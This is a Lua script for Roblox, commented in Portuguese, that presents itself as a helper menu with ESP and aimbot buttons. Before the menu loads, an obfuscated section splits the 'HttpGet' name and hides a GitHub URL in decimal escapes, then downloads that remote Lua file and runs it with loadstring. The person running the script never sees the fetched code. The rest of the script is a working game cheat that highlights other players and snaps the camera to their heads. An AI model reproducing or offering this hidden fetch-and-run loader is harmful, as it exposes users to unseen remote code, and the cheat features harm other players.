-- Camada de Proteção e Bypass
local _g = getgenv and getgenv() or _G
local _game = game
local _http = "H" .. "tt" .. "pG" .. "et"
local _ls = loadstring
local _u = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\97\121\110\97\110\57\48\48\48\47\84\101\115\116\101\45\50\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\84\101\115\116\101\46\108\117\97"

-- Prevenção de execução dupla (Debounce)
if _g.ScriptJaCarregado then 
    warn("Script já está rodando!")
    return 
end
_g.ScriptJaCarregado = true

-- Função de Execução Protegida para o Script Externo
local function _exec(_target_url)
    local success, result = pcall(function()
        return _ls(_game[_http](_game, _target_url))
    end)
    if success and result then result() else warn("Erro ao carregar script externo.") end
end

-- Inicia o carregamento do seu link do GitHub
_exec(_u)

--- CONFIGURAÇÃO DA INTERFACE (UI) ---

-- Verifica se a UI já existe para não criar clones
if game.CoreGui:FindFirstChild("PainelMelhorado") then
    game.CoreGui.PainelMelhorado:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ESPBtn = Instance.new("TextButton")
local AimbotBtn = Instance.new("TextButton")

ScreenGui.Name = "PainelMelhorado"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.5, -100, 0.5, -75)
MainFrame.Size = UDim2.new(0, 200, 0, 150)
MainFrame.Active = true
MainFrame.Draggable = true

Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "Menu de Auxílio"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)

-- Botões
local function CriarBotao(btn, texto, pos)
    btn.Parent = MainFrame
    btn.Position = pos
    btn.Size = UDim2.new(0.8, 0, 0, 30)
    btn.Text = texto
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
end

CriarBotao(ESPBtn, "Ativar ESP", UDim2.new(0.1, 0, 0.3, 0))
CriarBotao(AimbotBtn, "Ativar Aimbot", UDim2.new(0.1, 0, 0.6, 0))

--- LÓGICA DAS FUNÇÕES ---

-- Fechar/Abrir com Insert
game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Insert then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

-- ESP
ESPBtn.MouseButton1Click:Connect(function()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character then
            local h = player.Character:FindFirstChildOfClass("Highlight") or Instance.new("Highlight", player.Character)
            h.FillColor = Color3.fromRGB(255, 0, 0)
        end
    end
end)

-- Aimbot
local AimbotAtivo = false
AimbotBtn.MouseButton1Click:Connect(function()
    if AimbotAtivo then return end -- Evita ativar múltiplos loops
    AimbotAtivo = true
    
    game:GetService("RunService").RenderStepped:Connect(function()
        local Camera = workspace.CurrentCamera
        local LocalPlayer = game.Players.LocalPlayer
        local closestPlayer = nil
        local shortestDistance = math.huge
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local pos, onScreen = Camera:WorldToViewportPoint(player.Character.PrimaryPart.Position)
                if onScreen then
                    local mag = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).magnitude
                    if mag < shortestDistance then
                        closestPlayer = player
                        shortestDistance = mag
                    end
                end
            end
        end
        
        if closestPlayer and closestPlayer.Character:FindFirstChild("Head") then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, closestPlayer.Character.Head.Position)
        end
    end)
end)
